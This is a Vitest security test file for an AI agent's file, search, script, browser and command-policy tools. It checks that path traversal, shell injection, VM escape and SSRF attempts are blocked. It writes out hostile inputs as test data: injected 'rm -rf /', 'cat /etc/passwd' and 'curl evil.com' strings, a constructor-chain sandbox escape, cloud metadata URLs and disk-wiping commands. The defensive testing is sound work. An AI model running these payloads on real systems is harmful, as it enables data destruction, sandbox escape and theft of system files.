/**
 * Security tests for Commander tools and sandbox.
 * Tests the critical and high severity vulnerabilities found and fixed
 * in the 2026-05-31 security audit.
 *
 * Sources: Codex CLI command safety classification, Claude Code permission patterns,
 * arXiv 2604.21816 lazy schema loading.
 */
import { describe, it, expect, beforeAll } from 'vitest';

describe('FileSystemTool Security', () => {
  let FileReadTool: any, FileWriteTool: any, FileEditTool: any, FileSearchTool: any, GlobTool: any;

  beforeAll(async () => {
    const mod = await import('../src/tools/fileSystemTool');
    FileReadTool = mod.FileReadTool;
    FileWriteTool = mod.FileWriteTool;
    FileEditTool = mod.FileEditTool;
    FileSearchTool = mod.FileSearchTool;
    GlobTool = mod.GlobTool;
  });

  describe('safePath — prefix collision prevention', () => {
    it('should reject paths that escape workspace via prefix collision', async () => {
      const tool = new FileReadTool();
      // If SAFE_ROOT is /workspace, /workspace-evil should NOT pass
      const result = await tool.execute({ path: '../../../etc/passwd' });
      expect(result).toContain('Access denied');
    });

    it('should reject symlink traversal attempts', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: '/etc/passwd' });
      expect(result).toMatch(/Access denied|outside workspace/);
    });
  });

  describe('FileSearchTool — path traversal fix', () => {
    it('should reject glob patterns that traverse outside workspace', async () => {
      const tool = new FileSearchTool();
      // Pattern like ../../etc/**/*.conf should not traverse outside workspace
      const result = await tool.execute({ pattern: '../../etc/**/*.conf' });
      // Should return no results — not actual /etc file contents like "passwd" or "shadow"
      expect(result).not.toContain('passwd');
      expect(result).not.toContain('shadow');
      expect(result).not.toContain('hosts');
    });

    it('should reject dirPattern that resolves outside workspace', async () => {
      const tool = new FileSearchTool();
      const result = await tool.execute({ pattern: '../../**/*.json' });
      expect(result).not.toContain('Error');
      // Should return empty or workspace-only results
    });
  });

  describe('matchGlob — regex injection prevention', () => {
    it('should not treat dots as wildcards', async () => {
      const tool = new FileSearchTool();
      // file.txt should NOT match fileXtxt
      // We test this indirectly by searching for a pattern with dots
      const result = await tool.execute({ pattern: 'package.json' });
      // If dots were wildcards, this would match package-json, packageXjson, etc.
      expect(result).not.toMatch(/package.json[^"]/);
    });
  });

  describe('maxChars validation', () => {
    it('should reject negative maxChars', async () => {
      const tool = new FileReadTool();
      // Negative maxChars should be clamped to positive
      const result = await tool.execute({ path: 'package.json', maxChars: -5 });
      // Should not return garbled output from slice(0, -5)
      expect(result).not.toContain('undefined');
    });

    it('should reject NaN maxChars', async () => {
      const tool = new FileReadTool();
      const result = await tool.execute({ path: 'package.json', maxChars: 'abc' });
      // Should fall back to default, not return empty
      expect(result.length).toBeGreaterThan(0);
    });
  });

  describe('FileWriteTool — size limit', () => {
    it('should reject content larger than 10MB', async () => {
      const tool = new FileWriteTool();
      const bigContent = 'x'.repeat(11 * 1024 * 1024);
      const result = await tool.execute({ path: 'test-big.txt', content: bigContent });
      expect(result).toContain('too large');
    });
  });
});

describe('CodeSearchTool Security', () => {
  let CodeSearchTool: any;

  beforeAll(async () => {
    const mod = await import('../src/tools/codeSearchTool');
    CodeSearchTool = mod.CodeSearchTool;
  });

  it('should NOT execute shell commands via pattern injection', async () => {
    const tool = new CodeSearchTool();
    // This pattern would execute "rm -rf /" if execSync was used
    // With execFileSync, the pattern is passed as a grep argument, not shell-interpreted
    const result = await tool.execute({ pattern: '"; rm -rf / #"' });
    // Should return search results (grep finding the literal string) or "no results"
    // The key is it does NOT execute rm — it searches for the literal string
    // If it executed rm, we'd see filesystem errors or the test would crash
    expect(result).toBeDefined();
    // Should NOT contain shell execution errors
    expect(result).not.toMatch(/sh:|bash:|command not found/);
  });

  it('should NOT execute shell commands via filePattern injection', async () => {
    const tool = new CodeSearchTool();
    const result = await tool.execute({
      pattern: 'test',
      filePattern: '"; cat /etc/passwd #',
    });
    // filePattern is passed as a grep argument via execFileSync, not shell-interpreted
    // Should return no results or search error, not /etc/passwd contents
    expect(result).not.toMatch(/root:.*:0:0/);
    expect(result).not.toMatch(/nobody:.*:65534/);
  });
});

describe('VerificationTool Security', () => {
  let VerificationTool: any;

  beforeAll(async () => {
    const mod = await import('../src/tools/verificationTool');
    VerificationTool = mod.VerificationTool;
  });

  it('should sanitize testPattern to prevent command injection', async () => {
    const tool = new VerificationTool();
    // This would execute "curl evil.com" if testPattern was interpolated into shell
    const result = await tool.execute({
      checks: ['test'],
      testPattern: '; curl evil.com #',
    });
    // Should not make any network request — pattern should be sanitized
    expect(result).not.toContain('curl');
    expect(result).not.toContain('evil.com');
  });

  it('should strip shell metacharacters from testPattern', async () => {
    const tool = new VerificationTool();
    const result = await tool.execute({
      checks: ['test'],
      testPattern: '$(whoami)',
    });
    // Pattern should be stripped to empty — either Invalid error or no test runner found
    // The key is that $(whoami) is NOT executed
    expect(result).not.toContain('whoami');
    expect(result).not.toContain('root');
  });
});

describe('ScriptTool Security', () => {
  let ExecuteScriptTool: any;

  beforeAll(async () => {
    const mod = await import('../src/tools/scriptTool');
    ExecuteScriptTool = mod.ExecuteScriptTool;
  });

  it('should block VM escape via constructor chain', async () => {
    const tool = new ExecuteScriptTool();
    // Set up empty tools map (no tools needed for this test)
    tool.setTools(new Map());
    // This classic VM escape should be blocked by the Proxy wrapper
    const result = await tool.execute({
      script: `
        try {
          const process = this.constructor.constructor('return process')();
          const result = process.mainModule.require('child_process').execSync('whoami').toString();
          console.log('ESCAPED:', result);
        } catch (e) {
          console.log('BLOCKED:', e.message);
        }
      `,
    });
    // Should NOT contain actual username — escape should be blocked
    // The Proxy blocks access to 'constructor' property
    expect(result).not.toContain('ESCAPED:');
  });

  it('should block access to __proto__', async () => {
    const tool = new ExecuteScriptTool();
    tool.setTools(new Map());
    const result = await tool.execute({
      script: `
        try {
          const proto = tools.__proto__;
          console.log('PROTO:', typeof proto);
        } catch (e) {
          console.log('BLOCKED');
        }
      `,
    });
    // Proxy returns undefined for __proto__, so it should not be 'object'
    expect(result).not.toContain('PROTO: object');
  });

  it('should report correct isReadOnly flag', () => {
    const tool = new ExecuteScriptTool();
    expect(tool.isReadOnly).toBe(false);
    expect(tool.isConcurrencySafe).toBe(false);
  });
});

describe('BrowserTool Security', () => {
  let BrowserFetchTool: any;

  beforeAll(async () => {
    const mod = await import('../src/tools/browserTool');
    BrowserFetchTool = mod.BrowserFetchTool;
  });

  it('should block SSRF to localhost', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://localhost:6379/' });
    // Should be blocked by SSRF check — error message contains "Blocked" or "Failed"
    expect(result).toMatch(/Blocked|Failed|internal|private/);
  });

  it('should block SSRF to AWS metadata endpoint', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://169.254.169.254/latest/meta-data/' });
    expect(result).toMatch(/Blocked|Failed|internal|private/);
  });

  it('should block SSRF to private IP ranges', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://10.0.0.1:8080/admin' });
    expect(result).toMatch(/Blocked|Failed|internal|private/);
  });

  it('should block SSRF to 192.168.x.x', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'http://192.168.1.1/' });
    expect(result).toMatch(/Blocked|Failed|internal|private/);
  });

  it('should reject non-http URLs', async () => {
    const tool = new BrowserFetchTool();
    const result = await tool.execute({ url: 'ftp://example.com/' });
    expect(result).toMatch(/Invalid|http|Failed/);
  });
});

describe('ExecPolicy Security', () => {
  let ExecPolicyEngine: any;

  beforeAll(async () => {
    const mod = await import('../src/sandbox/execPolicy');
    ExecPolicyEngine = mod.ExecPolicyEngine;
  });

  describe('command safety classification (from Codex CLI)', () => {
    it('should auto-allow safe read-only commands', () => {
      const engine = new ExecPolicyEngine();
      expect(engine.evaluate('ls -la').decision).toBe('allow');
      expect(engine.evaluate('cat file.txt').decision).toBe('allow');
      expect(engine.evaluate('grep -rn pattern .').decision).toBe('allow');
      expect(engine.evaluate('head -5 file.txt').decision).toBe('allow');
      expect(engine.evaluate('pwd').decision).toBe('allow');
    });

    it('should prompt for network commands', () => {
      const engine = new ExecPolicyEngine();
      expect(engine.evaluate('curl https://example.com').decision).toBe('prompt');
      expect(engine.evaluate('wget https://example.com').decision).toBe('prompt');
    });

    it('should block dangerous commands', () => {
      const engine = new ExecPolicyEngine();
      expect(engine.evaluate('sudo rm -rf /').decision).toBe('forbidden');
      expect(engine.evaluate('mkfs.ext4 /dev/sda').decision).toBe('forbidden');
    });

    it('should prompt for inline code execution (Codex banned prefixes)', () => {
      const engine = new ExecPolicyEngine();
      expect(engine.evaluate('python3 -c "import os; os.system(\'rm -rf /\')"').decision).toBe('prompt');
      expect(engine.evaluate('node -e "process.exit()"').decision).toBe('prompt');
      expect(engine.evaluate('bash -lc "malicious"').decision).toBe('prompt');
    });
  });

  describe('process wrapper stripping (from Claude Code)', () => {
    it('should strip timeout prefix and match inner command', () => {
      const engine = new ExecPolicyEngine();
      // "timeout 30 npm test" should match the "npm" rule (allow)
      const result = engine.evaluate('timeout 30 npm test');
      expect(result.decision).toBe('allow');
    });

    it('should strip nice prefix and match inner command', () => {
      const engine = new ExecPolicyEngine();
      const result = engine.evaluate('nice -n 10 grep -rn pattern .');
      expect(result.decision).toBe('allow');
    });
  });

  describe('shell command substitution detection', () => {
    it('should prompt for destructive commands with substitution', () => {
      const engine = new ExecPolicyEngine();
      // rm -rf with command substitution should prompt (destructive rule)
      const result = engine.evaluate('rm -rf $(cat /etc/passwd)');
      expect(result.decision).toBe('prompt');
    });

    it('should prompt for unknown commands (default fail-safe)', () => {
      const engine = new ExecPolicyEngine();
      // Unknown commands should default to prompt (fail-safe)
      const result = engine.evaluate('unknown-command-xyz');
      expect(result.decision).toBe('prompt');
    });
  });
});
